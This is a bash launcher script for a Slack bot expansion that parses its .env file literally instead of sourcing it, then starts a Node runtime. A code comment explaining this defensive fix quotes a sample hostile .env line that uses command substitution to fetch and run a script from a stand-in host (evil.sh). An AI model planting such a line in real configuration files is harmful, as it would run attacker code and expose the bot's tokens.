#!/usr/bin/env bash
# Slack Expansion — Linux launcher
set -euo pipefail

EXPANSION_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

# F6 (v1.0.4): strict KEY=VAL parser instead of `source .env`.
# `source` executes the file as shell, so a hostile .env (e.g. a line like
# `SLACK_BOT_TOKEN=$(curl evil.sh|sh)`) would run arbitrary commands. This
# parser only ever assigns literal values — it never evaluates them. Mirrors
# the tokenized parser already used in start.bat.
load_env() {
  local file="$1" line key val
  while IFS= read -r line || [[ -n "$line" ]]; do
    # Strip a trailing CR so CRLF-saved .env files parse correctly.
    line="${line%$'\r'}"
    # Skip blank lines and comments.
    [[ -z "$line" || "$line" == \#* ]] && continue
    # Tolerate a leading `export `.
    [[ "$line" == export\ * ]] && line="${line#export }"
    # Require KEY=VAL with a valid shell-identifier key.
    [[ "$line" != *=* ]] && continue
    key="${line%%=*}"
    val="${line#*=}"
    [[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || continue
    # Strip one layer of matching surrounding quotes, if present.
    if [[ "$val" == \"*\" && ${#val} -ge 2 ]]; then
      val="${val:1:${#val}-2}"
    elif [[ "$val" == \'*\' && ${#val} -ge 2 ]]; then
      val="${val:1:${#val}-2}"
    fi
    # Assign as a literal value and export — never evaluated as code.
    printf -v "$key" '%s' "$val"
    export "${key?}"
  done < "$file"
}

if [[ -f "${EXPANSION_DIR}/.env" ]]; then
  load_env "${EXPANSION_DIR}/.env"
else
  echo "[mypka-slack:start] ERROR: ${EXPANSION_DIR}/.env not found. Run scripts/install.sh first." >&2
  exit 1
fi

if [[ -z "${SLACK_BOT_TOKEN:-}" ]] || [[ -z "${SLACK_APP_TOKEN:-}" ]]; then
  echo "[mypka-slack:start] ERROR: SLACK_BOT_TOKEN and SLACK_APP_TOKEN are required in .env." >&2
  exit 1
fi

cd "${EXPANSION_DIR}/runtime"
exec node index.js
